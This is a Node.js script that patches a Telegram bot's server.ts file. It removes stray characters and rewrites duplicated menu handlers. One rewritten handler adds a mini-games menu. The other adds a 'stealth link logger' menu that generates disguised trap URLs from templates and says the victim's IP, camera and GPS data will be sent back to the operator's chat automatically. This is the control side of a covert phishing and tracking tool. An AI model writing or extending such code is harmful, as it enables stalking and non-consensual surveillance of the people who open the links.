import fs from 'fs';
let c = fs.readFileSync('server.ts', 'utf8');

// 1. Remove binary characters
c = c.replace(/\ufffd/g, '');

// 2. Fix duplicated bot action blocks
const startMain = "bot.action('menu_main'";
const startLogger = "bot.action('menu_logger'";

// Replace the first (likely broken) menu_logger block with menu_games
// and ensure there's only one menu_logger block later.

// This is tricky without exact matches. 
// I'll use a more surgical approach.

const lines = c.split('\n');
const newLines = [];
let skipping = false;
let foundLoggerCount = 0;

for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.includes("bot.action('menu_logger'")) {
        foundLoggerCount++;
        if (foundLoggerCount === 1) {
            // First occurrence: convert to menu_games + start it
            newLines.push("    bot.action('menu_games', (ctx) => {");
            newLines.push("      ctx.answerCbQuery().catch(() => {});");
            newLines.push("      const txt = `<b>🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ ʜᴜʙ</b>\\n` +");
            newLines.push("        `━━━━━━━━━━━━━━━━━━━━\\n\\n` +");
            newLines.push("        `• <b>/tebakangka</b> (1-10)\\n` +");
            newLines.push("        `• <b>/khodam [ɴᴀᴍᴀ]</b>\\n` +");
            newLines.push("        `• <b>/ramal [ɴᴀᴍᴀ]</b>\\n` +");
            newLines.push("        `• <b>/jodoh [ɴ1] [ɴ2]</b>\\n` +");
            newLines.push("        `• <b>/8ball [ᴛᴇᴋꜱ]</b>\\n\\n` +");
            newLines.push("        `━━━━━━━━━━━━━━━━━━━━`;");
            newLines.push("      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);");
            newLines.push("      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});");
            newLines.push("    });");
            skipping = true;
            continue;
        } else {
             // Second occurrence: write the clean menu_logger
            newLines.push("    bot.action('menu_logger', (ctx) => {");
            newLines.push("      ctx.answerCbQuery().catch(() => {});");
            newLines.push("      const id = generateTrapId(ctx.chat!.id);");
            newLines.push("      let msg = `━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━\\n` +");
            newLines.push("                `<b>🎣 ꜱᴛᴇᴀʟᴛʜ ʟɪɴᴋ ʟᴏɢɢᴇʀ ᴠ.1</b>\\n` +");
            newLines.push("                `━━━━━━━━━━━━━━━━━━━━\\n` +");
            newLines.push("                `ᴘɪʟɪʜ ᴛᴇᴍᴘʟᴀᴛᴇ ʙᴇʀɪᴋᴜᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ:\\n\\n`;");
            newLines.push("");
            newLines.push("      Object.entries(templates).forEach(([key, tmpl]) => {");
            newLines.push("        const trapUrl = `${appHost.replace(/\\/$/, '')}/t/${key}/${id}`;");
            newLines.push("        msg += `📦 <b>${tmpl.name}</b>\\n` +");
            newLines.push("               `🔗 <code>${trapUrl}</code>\\n\\n`;");
            newLines.push("      });");
            newLines.push("");
            newLines.push("      msg += `━━━━━━━━━━━━━━━━━━━━\\n` +");
            newLines.push("             `💡 ɪɴꜰᴏ: ꜱᴇᴍᴜᴀ ᴅᴀᴛᴀ (ɪᴘ, ᴄᴀᴍ, ɢᴘꜱ) ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ ᴄʜᴀᴛ ɪɴɪ ꜱᴇᴄᴀʀᴀ ᴏᴛᴏᴍᴀᴛɪꜱ.`;");
            newLines.push("");
            newLines.push("      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);");
            newLines.push("      ctx.editMessageText(msg, {");
            newLines.push("        parse_mode: 'HTML',");
            newLines.push("        link_preview_options: { is_disabled: true },");
            newLines.push("        ...kb");
            newLines.push("      }).catch(() => {});");
            newLines.push("    });");
            skipping = true;
            continue;
        }
    }

    if (skipping) {
        if (line.includes("});") || line.includes("    });")) {
            skipping = false;
        }
        continue;
    }

    newLines.push(line);
}

fs.writeFileSync('server.ts', newLines.join('\n'));
